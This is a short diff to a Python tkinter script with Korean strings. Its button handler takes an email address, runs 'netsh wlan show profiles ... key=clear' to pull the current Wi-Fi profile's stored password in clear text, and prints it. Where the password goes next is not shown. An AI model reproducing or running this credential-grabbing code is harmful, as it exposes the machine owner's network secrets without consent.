@@ -7,14 +7,16 @@ import time
 import tkinter.messagebox as msgbox
 from tkinter import *
 
-# def getstatusoutput(cmd):
-#     process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
-#     out, _ = process.communicate()
+def getstatusoutput(cmd):
+    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+    out, _ = process.communicate()
 
-#     if out[-1:] == b'\n':
-#         out = out[:-1]
+    if out[-1:] == b'\n':
+        out = out[:-1]
 
-#     return (process.returncode, out)
+    out = out.decode('cp949')
+
+    return (process.returncode, out)
 
 def btnSend(event):
     try:
@@ -22,13 +24,13 @@ def btnSend(event):
         print("email id :",email_id)
         if email_id:
             # wifi id 가져오기
-            _, interface_output = subprocess.getstatusoutput("netsh wlan show interface")
+            _, interface_output = getstatusoutput("netsh wlan show interface")
             
             profile = interface_output.split("프로필")[-1].split("\n")[0].split(":")[-1].strip()
             print("wifi id :", profile)
             
             # wifi pw 가져오기
-            _, password_output = subprocess.getstatusoutput("netsh wlan show profiles {} key=clear".format(profile))
+            _, password_output = getstatusoutput("netsh wlan show profiles {} key=clear".format(profile))
             password = password_output.split("키 콘텐츠")[-1].split("\n")[0].split(":")[-1].strip()  
             print("wifi pw :", password)
 
